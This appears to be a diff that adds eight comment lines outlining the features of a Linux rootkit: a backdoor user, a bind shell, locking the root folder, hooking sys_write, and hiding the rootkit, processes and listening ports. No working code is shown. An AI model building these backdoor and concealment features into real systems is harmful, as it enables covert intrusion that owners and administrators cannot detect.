@@ -1,0 +1,8 @@
+//Create backdoor user
+//Create backdoor bind shell
+//Chmod, Chattr, NoClobber and Mount Bind root folder
+//Hide rootkit
+//Hide process
+//Hide listening port
+//Hide bind shell
+//Hook sys_write
